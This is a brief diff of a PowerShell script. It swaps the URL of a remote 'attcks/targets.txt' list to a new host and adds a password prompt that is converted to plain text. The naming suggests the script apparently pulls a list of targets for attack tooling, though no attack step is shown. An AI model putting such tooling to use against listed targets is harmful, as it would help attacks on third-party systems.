@@ -1,4 +1,4 @@
-$target = "https://attck.pages.dev/attcks/targets.txt"
+$target = "https://attck.community/attcks/targets.txt"
 $pass = Read-Host 'What is your password?' -AsSecureString
 $clearPass = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))
 
